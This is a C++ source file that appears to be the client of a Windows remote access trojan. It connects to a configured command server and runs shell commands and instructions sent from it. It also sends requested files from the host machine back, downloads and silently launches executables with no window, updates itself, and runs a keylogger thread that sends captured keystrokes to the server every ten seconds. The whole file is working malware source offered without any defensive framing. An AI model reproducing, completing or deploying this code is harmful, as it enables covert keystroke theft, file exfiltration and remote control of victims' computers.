#include "Client.h"
#include "serviceutils.h"
#include <Shared/utility.h>

#include <cstdio>
#include <process.h>
#include <libzippp/libzippp.h>

using namespace libzippp;

Client* Client::clientptr = NULL;
bool Client::connected = false;
Client Client::main_client(Settings::serverIP, Settings::serverPort);
keylogger logger = keylogger();
auto temp_name = std::string("tempfile.tmp");


bool Client::ProcessPacketType(PacketType _PacketType)
{
	switch (_PacketType)
	{
	case PacketType::Instruction:
	{
		std::string msg;
		if (!GetString(msg))
			return false;
		SendString(General::processCommand(msg), PacketType::Instruction);
		break;
	}

	case PacketType::CMDCommand:
	{
		std::string msg;
		if (!GetString(msg))
			return false;
		if (CMD::cmdptr != NULL)
		{
			CMD::cmdptr->writeCMD(msg);
			break;
		}
		else
		{
			SendString("Initiate a CMD session first.", PacketType::Warning);
			break;
		}
	}

	case PacketType::FileTransferByteBuffer:
	{
		int32_t buffersize; //buffer to hold size of buffer to write to file
		if (!Getint32_t(buffersize)) //get size of buffer as integer
			return false;
		if (!recvall(file.buffer, buffersize)) //get buffer and store it in file.buffer
		{
			return false;
		}
		file.outfileStream.write(file.buffer, buffersize); //write buffer from file.buffer to our outfilestream
		file.bytesWritten += buffersize; //increment byteswritten
		//std::cout << "Received byte buffer for file transfer of size: " << buffersize << std::endl;
		if (!SendPacketType(PacketType::FileTransferRequestNextBuffer)) //send PacketType type to request next byte buffer (if one exists)
			return false;
		break;
	}
	case PacketType::FileTransfer_EndOfFile:
	{
		//std::cout << "File transfer completed. File received." << std::endl;
		//std::cout << "File Name: " << file.fileName << std::endl;
		//std::cout << "File Size(bytes): " << file.bytesWritten << std::endl;
		file.bytesWritten = 0;
		file.outfileStream.close(); //close file after we are done writing file

		while (!rename((GetCWD() + temp_name).c_str(), (GetCWD() + file.fileName).c_str())) {
			Sleep(100);
		}
		break;
	}
	case PacketType::ClientFileTransferRequestFile:
	{
		std::string FileName; //string to store file name
		if (!GetString(FileName)) //If issue getting file name
			return false; //Failure to process packet

		ofile = FileTransferData();
		ofile.infileStream.open(FileName, std::ios::binary | std::ios::ate); //Open file to read in binary | ate mode. We use ate so we can use tellg to get file size. We use binary because we need to read bytes as raw data
		if (!ofile.infileStream.is_open()) //If file is not open? (Error opening file?)
		{
			return true;
		}
		ofile.fileName = FileName; //set file name just so we can print it out after done transferring
		ofile.fileSize = ofile.infileStream.tellg(); //Get file size
		ofile.infileStream.seekg(0); //Set cursor position in file back to offset 0 for when we read file
		ofile.fileOffset = 0; //Update file offset for knowing when we hit end of file

		if (!HandleSendFile()) //Attempt to send byte buffer from file. If failure...
			return false;
		break;
	}
	case PacketType::ClientFileTransferRequestNextBuffer:
	{
		if (!HandleSendFile()) //Attempt to send byte buffer from file. If failure...
			return false;
		break;
	}
	case PacketType::Download: {
		std::string exe;
		if (!GetString(exe))
			return false;

		if (!FileExists((SHELL_PATH() + exe).c_str())) {
			int i = 0;
			while (!Client::main_client.RequestFile(exe)) {
				if (i > 9)
					return true;
				Log("Failed to request file, retrying...");
				Client::main_client.RequestFile(exe);
				i++;
			}
		}
		else {
			SendString("File already exists, delete it before attempting to override it!", PacketType::Warning);
		}

		break;
	}
	case PacketType::Execute: {
		std::string exe;
		if (!GetString(exe))
			return false;
		PROCESS_INFORMATION piProcInfo;
		STARTUPINFO siStartInfo;
		BOOL bSuccess = FALSE;

		// Set up members of the PROCESS_INFORMATION structure. 

		ZeroMemory(&piProcInfo, sizeof(PROCESS_INFORMATION));

		// Set up members of the STARTUPINFO structure. 
		// This structure specifies the STDIN and STDOUT handles for redirection.

		ZeroMemory(&siStartInfo, sizeof(STARTUPINFO));
		siStartInfo.cb = sizeof(STARTUPINFO);

		// Create the child process. 
		bSuccess = CreateProcess(exe.c_str(),
			NULL,     // command line 
			NULL,          // process security attributes 
			NULL,          // primary thread security attributes 
			TRUE,          // handles are inherited 
			CREATE_NO_WINDOW,             // creation flags 
			NULL,          // use parent's environment 
			NULL,          // use parent's current directory 
			&siStartInfo,  // STARTUPINFO pointer 
			&piProcInfo);  // receives PROCESS_INFORMATION 

						   // If an error occurs, exit the application. 
		if (bSuccess) {
			CloseHandle(piProcInfo.hProcess);
			CloseHandle(piProcInfo.hThread);
		}

		if (bSuccess) {
			SendString("Process started successfully", PacketType::Warning);
		}
		else {
			SendString("Couldn't start process", PacketType::Warning);
		}
		break;
	}
	case PacketType::Update:
	{
		//Just because otherwise it messes with the next instructions
		std::string exe;
		if (!GetString(exe))
			return false;

		Log("Update init\n");
		//Temporary rename to trigger update in main routine
		rename(SHELL_NAME, SHELL_UPDATE_NAME);
		rename(SHELL_BACKUP_NAME, SHELL_UPDATE_NAME);
		Log("Renamed old files\n");
		SendString("Renamed files successfully, update begun\n", PacketType::Warning);
		break;
	}
	case PacketType::Heartbeat:
		break;
	default: //If PacketType type is not accounted for
		std::cout << "Unrecognized PacketType: " << (int32_t)_PacketType << std::endl; //Display that PacketType was not found
		break;
	}
	return true;
}

void Client::ClientThread()
{
	PacketType PacketType;
	while (true)
	{
		if (!clientptr->GetPacketType(PacketType)) //Get PacketType type
			break; //If there is an issue getting the PacketType type, exit this loop
		if (!clientptr->ProcessPacketType(PacketType)) //Process PacketType (PacketType type)
			break; //If there is an issue processing the PacketType, exit this loop
	}
	connected = false;
	//std::cout << "Lost connection to the server." << std::endl;
	if (clientptr->CloseConnection()) //Try to close socket connection..., If connection socket was closed properly
	{
		//std::cout << "Socket to the server was closed successfuly." << std::endl;
	}
	else //If connection socket was not closed properly for some reason from our function
	{
		//std::cout << "Socket was not able to be closed." << std::endl;
	}
}

void Client::KeyloggerThread() {
	while (true) {
		if (keylogger::buffer.size()) {
			clientptr->SendString(logger.GetBuffer(), PacketType::Keylog);
			logger.ClearBuffer();
		}
		Sleep(10000);
	}
}

bool Client::resolveIP(std::string &hostname)
{
	int sockfd;
	struct addrinfo hints, *servinfo, *p;
	struct sockaddr_in *h;
	int rv;
	char ip[INET6_ADDRSTRLEN];

	memset(&hints, 0, sizeof hints);
	hints.ai_family = AF_UNSPEC; // use AF_INET6 to force IPv6
	hints.ai_socktype = SOCK_STREAM;

	if ((rv = getaddrinfo(hostname.c_str(), "http", &hints, &servinfo)) != 0)
	{
		fprintf(stderr, "getaddrinfo: %s\n", gai_strerror(rv));
		return false;
	}

	// loop through all the results and connect to the first we can
	for (p = servinfo; p != NULL; p = p->ai_next)
	{
		h = (struct sockaddr_in *) p->ai_addr;
		strcpy_s(ip, INET6_ADDRSTRLEN, inet_ntoa(h->sin_addr));
	}

	freeaddrinfo(servinfo); // all done with this structure
	hostname = ip;
	return true;
}

bool Client::RequestFile(std::string FileName, bool wait)
{
	if(wait)
		//Wait just in case another file is already being downloaded
		while (file.outfileStream.is_open()) 
			Sleep(100);
	file.outfileStream.open(GetCWD() + temp_name, std::ofstream::binary); //open file to write file to
	file.fileName = FileName; //save file name
	file.bytesWritten = 0; //reset byteswritten to 0 since we are working with a new file
	if (!file.outfileStream.is_open()) //if file failed to open...
	{
		Log(("ERROR: Function(Client::RequestFile) - Unable to open file: " + FileName + " for writing.\n").c_str());
		return false;
	}
	Log(("Requesting file from server: " + FileName + "\n").c_str());
	if (!SendString(FileName, PacketType::FileTransferRequestFile)) //send file name
		return false;
	return true;
}

Client::Client(std::string IP, int PORT)
{
	//Winsock Startup
	WSAData wsaData;
	WORD DllVersion = MAKEWORD(2, 1);
	if (WSAStartup(DllVersion, &wsaData) != 0)
	{
		exit(0);
	}
	resolveIP(IP);
	addr.sin_addr.s_addr = inet_addr(IP.c_str()); //Address (127.0.0.1) = localhost (this pc)
	addr.sin_port = htons(PORT); //Port 
	addr.sin_family = AF_INET; //IPv4 Socket
	clientptr = this; //Update ptr to the client which will be used by our client thread
}

bool Client::Connect()
{
	Connection = socket(AF_INET, SOCK_STREAM, NULL); //Set Connection socket
	if (connect(Connection, (SOCKADDR*)&addr, sizeof(addr)) != 0) //If we are unable to connect...
	{
		return false;
	}

	//std::cout << "Connected!" << std::endl;
    _beginthreadex(NULL, NULL, (_beginthreadex_proc_type)ClientThread, NULL, NULL, NULL); //Create the client thread that will receive any data that the server sends.
	connected = true;
	return true;
}

bool Client::CloseConnection()
{
	if (closesocket(Connection) == SOCKET_ERROR)
	{
		if (WSAGetLastError() == WSAENOTSOCK) //If socket error is that operation is not performed on a socket (This happens when the socket has already been closed)
			return true; //return true since connection has already been closed

		std::string ErrorMessage = "Failed to close the socket. Winsock Error: " + std::to_string(WSAGetLastError()) + ".";
		//TODO: HANDLE ERROR
		return false;
	}
	return true;
}

bool unzip(const std::string& zipPath, const std::string& desPath)
{
	ZipArchive zf(zipPath);
	zf.open(ZipArchive::ReadOnly);
	if (!zf.isOpen()) {
		zf.close();
		return false;
	}

	std::vector<ZipEntry> entries = zf.getEntries();
	std::vector<ZipEntry>::iterator it;
	for (it = entries.begin(); it != entries.end(); ++it) {
		ZipEntry entry = *it;
		std::string name = entry.getName();
		int size = entry.getSize();

		//the length of binaryData will be size
		void* binaryData = entry.readAsBinary();

		//the length of textData will be size
		size_t textData = entry.readAsText().length();

		std::ofstream outFile(desPath + name, std::ofstream::binary);
		outFile.write((char*)binaryData, textData);
		outFile.close();
		//...
	}

	zf.close();

	return true;
}